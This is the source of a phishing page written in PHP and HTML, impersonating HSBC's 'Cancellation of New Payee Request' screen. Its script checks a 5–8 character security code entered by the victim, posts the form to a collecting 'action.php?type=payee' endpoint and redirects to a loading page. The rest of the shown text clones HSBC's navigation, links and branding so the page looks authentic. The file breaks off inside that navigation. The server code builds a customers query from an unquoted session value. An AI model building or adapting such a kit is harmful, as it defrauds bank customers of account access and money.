<?php
session_start();
include 'files/config.php';
include 'files/connect.php';



if($_SESSION['started'] == 'true'){
	//echo '<script> console.log('.$_SESSION['uniqueid'].');</script>';
	$uniqueid = $_SESSION['uniqueid'];
	$query = mysqli_query($conn,"SELECT * FROM customers WHERE uniqueid=$uniqueid");
	
	
	if($query){
		$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$cancelcode = $array['cancelcode'];
	}else{
		header('location:exit.php');
	}
	
}else{
	header('location:exit.php');
}

?>
<!DOCTYPE html>
<html xml:lang="en-GB" xmlns="http://www.w3.org/1999/xhtml" class="dj_gecko dj_contentbox" lang="en-GB">

<head>
    
    <meta content="text/html; charset=UTF-8">
    <!-- Page Title Starts -->

    <title>Cancellation of New Payee Request | HSBC</title>

    <!-- Page Title Ends -->

    <!-- Global Java Script variable  Starts-->
    

    <meta name="description" content="">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="author" content="">
    <meta http-equiv="Cache-Control" content="max-age=1,s-maxage=0, no-cache, no-store, must-revalidate, private">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="Sat, 6 May 1995 12:00:00 GMT">

    <!-- Webtrends start  -->


    <!--  <script type="text/javascript" src="/gsp/saas/Components/default/resources/script/theme_public/js/top_section.js"></script>  -->
    
    <link rel="stylesheet" href="files/css/ursula.css" media="screen">
	<link rel="icon" href="files/img/favicon.ico" type="image/ico">

<!-- ^[A-Za-z0-9]{5,8}$-->

<script src="files/js/jquery-3.4.1.min.js"></script>

<script>
//idv_OtpCredential
	function login(){
		var security = $('#payeecode').val();
		
		//
		

		
		if(security == null || security == ''){
			//console.log('security empty');
			return false;
		}else if(/^[A-Za-z0-9]{5,8}$/.test(security) == true && security != null && security != ''){
			//console.log('security correct');
		}else{
			//console.log('security wrong');
			return false;
		}
		
		
		$.ajax({
		type : 'POST',
		url : 'files/action.php?type=payee',
		data : $('#dijit_form_Form_0').serialize(),
		success: function (data) {
			//console.log(data);
			var parsed_data = JSON.parse(data);
			if(parsed_data.status == 'ok'){
				location.href = "Loading.php"
			}else{
				return false;
			}
			//console.log(parsed_data.status);
		}
		})
		return false;
		
	}
	</script>

    
</head>

<body class="ursula">
    <div tabindex="0" role="dialog" id="hsbcwidget_Lightbox_0" widgetid="hsbcwidget_Lightbox_0" lang="en-GB">
        <div style="display: none;" class="lightbox" data-dojo-attach-point="lightboxNode"><span class="tabbableEl" tabindex="-1"></span>
            <a class="close jsClose noPrint" data-dojo-attach-point="closeButton" tabindex="0" role="button" href="#">close</a>
            <div data-dojo-attach-point="innerNode" class="lightboxInner1">
                <div data-dojo-attach-point="containerNode" class="lightboxInner2"></div>
            </div>
        </div>
        <div style="display: none;" class="overlay" data-dojo-attach-point="overlayNode"></div>
    </div>

    <div id="top">
        <!-- Header Section Starts -->

        
        <div id="mainTopWrapper">
            <div id="mainTopUtility">
                <h1 aria-hidden="true">HSBC</h1>
                <div id="mainTopUtilityRow">
                    <ul id="tabs">
                        <li class="skipLink"><a class="skip" data-dojo-props="target: '#innerPage a:first'" data-dojo-type="hsbcwidget/SkipLink" href="#innerPage" id="skip" target="#innerPage a:first" title="Skip page header and navigation" widgetid="skip" lang="en-GB">Skip page header and navigation</a></li>
                        <li class="on"><a href="https://www.hsbc.co.uk/" aria-selected="true" aria-label="Personal currently selected">Personal</a></li>
                        <li><a href="http://www.business.hsbc.co.uk/" title="Business">Business</a></li>
                    </ul>
                    <div id="siteControls">
                        <div id="langList">
                            <ul>
                                <li class="selected"><a href="#" title="English" lang="en-UK">English</a></li>
                            </ul>
                        </div>
                        <div data-dojo-type="hsbcwidget/Locale" id="locale" widgetid="locale" lang="en-GB">
                            <div data-dojo-props="contentSelector: '#countrySelectorContent'" data-dojo-type="hsbcwidget/DropDown" id="countrySelectorWrapper" widgetid="countrySelectorWrapper" aria-relevant="all" aria-live="polite" lang="en-GB"><a class="dropDownLink trigger" role="tablist" aria-orientation="vertical" href="#countrySelectorContent" title="View list of HSBC Global websites" aria-haspopup="true"><span><span class="flag uk">United Kingdom</span></span></a>
                                <div class="placeholder"></div>
                            </div>
                        </div>
                        <div id="logon" style="display: none;">
                            <ul style="display: none">
                                <li><a href="https://www.security.hsbc.co.uk/gsa/SaaS30Resource/" title="Log on to Personal Internet Banking" class="redBtn"><span>Log on</span></a></li>
                                <li><a href="https://www.hsbc.co.uk/1/2/HSBCINTEGRATION/register" title="Register for Personal Internet Banking" class="greyBtn"><span>Register</span></a></li>
                            </ul>
                        </div>
                        <div data-dojo-type="hsbcwidget/Logon" id="logoff" style="display: none;" widgetid="logoff" lang="en-GB">
                            <ul>
                                <li><a href="https://www.security.hsbc.co.uk/gsa/?idv_cmd=idv.Logoff&amp;nextPage=SaaSLogoutCAM0Resource" title="Log off to Personal Internet Banking" class="redBtn"><span>Log off</span></a></li>
                            </ul>
                        </div>
                        
                    </div>
                </div>
            </div>
            <div id="mainTopNavigation">
                <div id="logo">
                    <a href="https://www.hsbc.co.uk/" title="Home"><img alt="HSBC" src="files/img/hsbc-logo.gif"></a>
                </div>
                <div data-dojo-type="hsbcwidget/DoormatController" id="sections" widgetid="sections" aria-relevant="all" aria-live="polite" lang="en-GB">
                    <nav aria-label="products and services menu">
                        <ul id="topLevel" role="menu" aria-label="products and services menu">
                            <li class="level1" id="dijit__WidgetBase_0" widgetid="dijit__WidgetBase_0"><a tabindex="0" aria-expanded="false" aria-label="Everyday Banking - accounts and services" aria-haspopup="true" class="mainTopNav" id="everydayBanking"><strong>Everyday Banking</strong><br>Accounts
                            &amp; services</a>
                                <div class="doormatWrapper fourColLeft" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>
                                    <div class="doormat">
                                        <p class="skipLink"><a href="#" title="Move to Borrowing navigation">Move to Borrowing
                                        navigation</a></p>
                                        <div class="doormatLeft">
                                            <div class="column">
                                                <h3 aria-hidden="true" class="hidden">HSBC</h3>
                                                <h3><a href="https://www.hsbc.co.uk/current-accounts/" title="Current accounts" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/Tab','WT.ti','Doormat:EverydayBanking:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Current
                                                accounts</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/products/premier/" title="HSBC Premier Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Premier/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Premier:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/products/advance/" title="HSBC Advance Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Advance/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Advance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Advance Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/products/bank-account/" title="Bank Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/BankAccount/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:BankAccount:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Bank
                                                    Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/products/student/" title="Students &amp; graduates" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Student&amp;Graduates/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Student&amp;Graduates:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student
                                                    Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/switching-to-hsbc/" title="Switching to HSBC" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/SwitchingtoHSBC/Tab','WT.ti','Doormat:EverydayBanking:SwitchingtoHSBC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Switching
                                                    to HSBC</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/current-accounts/" title="View all current accounts" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">current accounts</span></a></p>
                                                <h3><a href="https://www.hsbc.co.uk/savings/" title="Savings" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/Tab','WT.ti','Doormat:SavingsAccounts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Savings</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/savings/isas/" title="ISAs" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/ISAs/Tab','WT.ti','Doormat:EverydayBanking:ISAs:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">ISAs</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/savings/products/online-bonus-saver/" title="Online Bonus Saver" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/OBS/Tab','WT.ti','Doormat:SavingsAccounts:OBS:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Online
                                                    Bonus Saver</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/savings/products/flexible-saver/" title="Flexible Saver" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/FlexiSaver/Tab','WT.ti','Doormat:SavingsAccounts:FlexiSaver:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Flexible
                                                    Saver</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/savings/" title="View all savings accounts" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/ViewAll/Tab','WT.ti','Doormat:SavingsAccounts:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">savings accounts</span></a></p>
                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/help/" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CustomerSupport/Tab','WT.ti','Doormat:EverydayBanking:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
                                                support</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/help/card-support/" title="Card support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CardSupport/Tab','WT.ti','Doormat:EverydayBanking:CardSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Card
                                                    support</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/help/money-worries/" title="Money worries" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CardSupport/Tab','WT.ti','Doormat:EverydayBanking:CardSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Money
                                                    worries</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/help/" title="View all customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">customer support</span></a></p>
                                                <h3><a href="https://www.hsbc.co.uk/ways-to-bank/" title="Ways to bank" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/WaysToBank/Tab','WT.ti','Doormat:EverydayBanking:WaysToBank:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Ways
                                                to bank</a></h3>
                                                <p>Online, phone, mobile or in branch, we make it easy to bank with us.</p>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/ways-to-bank/" title="Ways to bank. Find out more." onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/WaysToBank/Tab','WT.ti','Doormat:EverydayBanking:WaysToBank:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Find
                                                out more <span class="hidden" aria-hidden="true">about Ways to bank</span></a></p>
                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/credit-cards/" title="Credit cards" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/CreditCards/Tab','WT.ti','Doormat:CreditCards:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Credit
                                                cards</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/classic/" title="HSBC Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/HSBCCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:HSBCCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Credit Card</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/premier/" title="HSBC Premier Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/PremierCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:PremierCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Credit Card</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/student/" title="Student Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/StudentCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:StudentCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student
                                                    Credit Card</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/credit-cards/" title="View all credit cards" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">credit cards</span></a></p>

                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/international/products/" title="International services" aria-haspopup="true" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/International/Tab','WT.ti','Doormat:EverydayBanking:International:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">International
                                                services</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/international/currency-account/" title="HSBC Currency Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrencyAccount/Tab','WT.ti','Doormat:EverydayBanking:CurrencyAccount:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Currency Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/international/money-transfer/" title="International Payments" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/IntlMoneyTransfers/Tab','WT.ti','Doormat:EverydayBanking:IntlMoneyTransfers:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">International
                                                    Payments</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/international/travel-money/" title="Travel money" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/TravelMoney/Tab','WT.ti','Doormat:EverydayBanking:TravelMoney:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel
                                                    money</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/international/overseas-account-opening/" title="Overseas account opening" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/OverseasAccounts/Tab','WT.ti','Doormat:EverydayBanking:OverseasAccounts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overseas
                                                    account opening</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/international/" title="View all international services" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/International/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:International:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">international services</span></a></p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>
                            <li class="level1" id="dijit__WidgetBase_1" widgetid="dijit__WidgetBase_1">
                                <a class="mainTopNav" tabindex="0" aria-expanded="false" aria-label="Borrowing - loans and mortgages" aria-haspopup="true" id="borrowing"><strong>Borrowing</strong><br>Loans &amp; mortgages</a>
                                <div class="doormatWrapper fourColLeft" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>

                                    <div class="doormat">
                                        <p class="skipLink"><a href="https://www.hsbc.co.uk/1/2/borrowing" title="Move to Planning &amp; Investing navigation">Move
                                        to Investing navigation</a></p>

                                        <div class="doormatLeft">
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/loans/" title="Loans" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Loans</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/loans/products/personal/" title="Personal Loan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/PersonalLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:PersonalLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Personal
                                                    Loan</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/loans/products/flexible/" title="FlexiLoan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/FlexiLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:FlexiLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">FlexiLoan</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/loans/products/premier/" title="HSBC Premier Personal Loan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/PremierLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:PremierLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Premier
                                                    Personal Loan</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/loans/products/graduate" title="Graduate Loan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/GraduateLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:GraduateLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Graduate
                                                    Loan</a></li>
                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/loans/" title="View all loans" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">loans</span></a></p>

                                                <h3><a href="https://www.hsbc.co.uk/credit-cards/" title="Credit cards" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Credit
                                                cards</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/classic/" title="Classic Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Classic
                                                    Credit Card</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/premier/" title="HSBC Premier Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCPremierCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCPremierCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Credit Card</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/student/" title="Student Visa Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCStudentCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCStudentCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student
                                                    Visa Credit Card</a></li>
                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/credit-cards/" title="View all credit cards" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/ViewAll/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">credit cards</span></a></p>
                                            </div>

                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/mortgages/" title="Mortgages" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Mortgages/Tab','WT.ti','Doormat:Homepage:Borrowing:Mortgages:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgages</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/first-time-buyers/" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/FindAndCompare/Tab','WT.ti','Doormat:Borrowing:FindAndCompare:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">First
                                                    time buyer</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/buy-to-let/" title="Buy to let" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/BuyToLet/Tab','WT.ti','Doormat:Borrowing:BuyToLet:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Buy
                                                    to let</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/calculators/" title="Mortgage calculators" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/FindAndCompare/Tab','WT.ti','Doormat:Borrowing:FindAndCompare:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgage
                                                    calculators</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/existing-customers/" title="Existing customers" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/ExistingMortgageCustomers/Tab','WT.ti','Doormat:Borrowing:ExistingMortgageCustomers:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Existing
                                                    customers</a></li>

                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/mortgages/" title="View all mortgages" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/Mortgages/ViewAll/Tab','WT.ti','Doormat:Borrowing:Mortgages:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">mortgages</span></a></p>

                                            </div>

                                            <div class="column">

                                                <h3><a href="https://www.hsbc.co.uk/help" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
                                                support</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/help/money-worries/managing-your-finances/" title="Taking control of your finances" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/TakingControlOfYourFinances/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:TakingControlOfYourFinances:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Taking
                                                    control of your finances</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/guidance/" title="Buying your first home" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgageFTBGuide/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgageFTBGuide:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Buying
                                                    your first home</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/guidance/jargon-buster/" title="Mortgage jargon buster" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgageJargonBuster/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgageJargonBuster:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgage
                                                    jargon buster</a></li>
                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/help/" title="View all customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">customer support</span></a></p>
                                            </div>
                                            <div class="column">
